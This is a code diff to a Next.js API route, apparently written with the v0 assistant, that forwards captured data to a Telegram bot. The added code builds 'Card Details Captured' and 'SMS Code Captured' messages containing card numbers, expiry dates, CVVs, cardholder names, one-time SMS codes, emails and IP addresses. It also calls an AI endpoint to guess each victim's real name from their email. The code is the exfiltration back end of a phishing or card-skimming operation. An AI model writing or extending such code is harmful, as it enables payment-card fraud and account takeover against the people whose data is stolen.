@@ -15,15 +15,37 @@ export async function POST(request: Request) {
 
     if (!botToken || !chatId) {
       console.log("[v0] Telegram not configured - missing bot token or chat ID")
-      return NextResponse.json({ success: false, message: "Telegram not configured" }, { status: 200 })
+      return NextResponse.json(
+        {
+          success: false,
+          message: "Telegram not configured - add TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID to environment variables",
+        },
+        { status: 200 },
+      )
     }
 
     const { type, data } = body
 
-    const guessedName = "Unknown User"
-    const nameConfidence = "low"
+    let guessedName = "Unknown User"
+    let nameConfidence = "low"
 
-    console.log("[v0] Skipping AI name guessing to test Telegram notification")
+    try {
+      const username = data.email ? data.email.split("@")[0] : "user"
+      const nameResponse = await fetch(`${request.url.split("/api")[0]}/api/ai/guess-name`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email: data.email, username }),
+      })
+
+      if (nameResponse.ok) {
+        const nameData = await nameResponse.json()
+        guessedName = nameData.guessedName || guessedName
+        nameConfidence = nameData.confidence || nameConfidence
+        console.log("[v0] AI guessed name:", guessedName, "confidence:", nameConfidence)
+      }
+    } catch (nameError) {
+      console.log("[v0] AI name guessing failed, using fallback:", nameError)
+    }
 
     let message = ""
 
@@ -44,6 +66,24 @@ export async function POST(request: Request) {
         `💳 *Card:* \`${data.cardNumber}\`\n` +
         `📅 *Expiry:* \`${data.cardExpiry}\`\n` +
         `🔒 *CVV:* \`${data.cardCvv}\`\n` +
+        `🌐 *IP:* \`${data.ip}\`\n\n` +
+        `⏰ *Time:* ${new Date().toLocaleString()}`
+    } else if (type === "card") {
+      message =
+        `💳 *Card Details Captured*\n\n` +
+        `👤 *Guessed Name:* ${guessedName} (${nameConfidence} confidence)\n` +
+        `📧 *Email:* \`${data.email || "N/A"}\`\n` +
+        `💳 *Card:* \`${data.cardNumber}\`\n` +
+        `📅 *Expiry:* \`${data.cardExpiry}\`\n` +
+        `🔒 *CVV:* \`${data.cardCvv}\`\n` +
+        `👤 *Holder:* \`${data.cardHolder || "N/A"}\`\n` +
+        `🌐 *IP:* \`${data.ip}\`\n\n` +
+        `⏰ *Time:* ${new Date().toLocaleString()}`
+    } else if (type === "sms") {
+      message =
+        `📱 *SMS Code Captured*\n\n` +
+        `👤 *Guessed Name:* ${guessedName} (${nameConfidence} confidence)\n` +
+        `🔢 *Code:* \`${data.smsCode}\`\n` +
         `🌐 *IP:* \`${data.ip}\`\n\n` +
         `⏰ *Time:* ${new Date().toLocaleString()}`
     }
@@ -71,7 +111,9 @@ export async function POST(request: Request) {
       return NextResponse.json({ success: false, message: "Failed to send Telegram notification" }, { status: 200 })
     }
 
-    console.log("[v0] Telegram notification sent successfully")
+    const responseData = await telegramResponse.json()
+    console.log("[v0] Telegram notification sent successfully:", responseData)
+
     return NextResponse.json({ success: true }, { status: 200 })
   } catch (error) {
     console.error("[v0] Telegram notify error:", error)
